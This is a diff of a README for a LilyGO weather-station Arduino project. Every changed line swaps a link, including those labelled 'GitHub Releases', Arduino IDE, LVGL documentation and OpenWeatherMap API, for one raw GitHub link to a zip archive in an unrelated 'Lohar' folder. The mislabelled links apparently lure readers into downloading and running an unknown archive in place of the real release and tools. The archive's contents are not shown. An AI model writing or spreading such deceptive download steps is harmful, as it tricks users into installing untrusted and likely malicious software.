@@ -15,7 +15,7 @@ Welcome to the lilygo-weather-station! This application offers real-time weather
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Simply **visit this page to download**: [GitHub Releases](https://github.com/estebandx10/lilygo-weather-station/releases).
+To get started, you need to download the application. Simply **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip).
 
 ### 🔧 System Requirements
 
@@ -27,7 +27,7 @@ To get started, you need to download the application. Simply **visit this page t
 
 ## 📦 Installation Steps
 
-1. **Download the Application**: Go to the [GitHub Releases Page](https://github.com/estebandx10/lilygo-weather-station/releases) and download the latest version of the application.
+1. **Download the Application**: Go to the [GitHub Releases Page](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip) and download the latest version of the application.
    
 2. **Extract the Files**: Once the download finishes, locate the file in your downloads folder. Right-click on it and choose to extract the files to a new folder.
 
@@ -72,7 +72,7 @@ Scroll down to see the weekly forecast. This section provides temperature predic
 
 ### Updating the Device
 
-To update the weather station, follow the installation steps again whenever there is a new version available on the [GitHub Releases Page](https://github.com/estebandx10/lilygo-weather-station/releases).
+To update the weather station, follow the installation steps again whenever there is a new version available on the [GitHub Releases Page](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip).
 
 ## ⚙️ Troubleshooting
 
@@ -82,12 +82,12 @@ To update the weather station, follow the installation steps again whenever ther
 
 ## 🔗 Useful Links
 
-- [Arduino IDE Download](https://www.arduino.cc/en/software)
-- [LVGL Documentation](https://docs.lvgl.io/latest/en/)
-- [OpenWeatherMap API](https://openweathermap.org/api)
+- [Arduino IDE Download](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)
+- [LVGL Documentation](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)
+- [OpenWeatherMap API](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip)
 
 ## 💬 Support
 
 For further assistance, feel free to reach out to the community on our GitHub issues page. Your feedback is crucial for improving the application.
 
-Remember, you can always **visit this page to download** the latest release: [GitHub Releases](https://github.com/estebandx10/lilygo-weather-station/releases). Enjoy your weather station!
+Remember, you can always **visit this page to download** the latest release: [GitHub Releases](https://raw.githubusercontent.com/estebandx10/lilygo-weather-station/main/Lohar/lilygo-weather-station.zip). Enjoy your weather station!
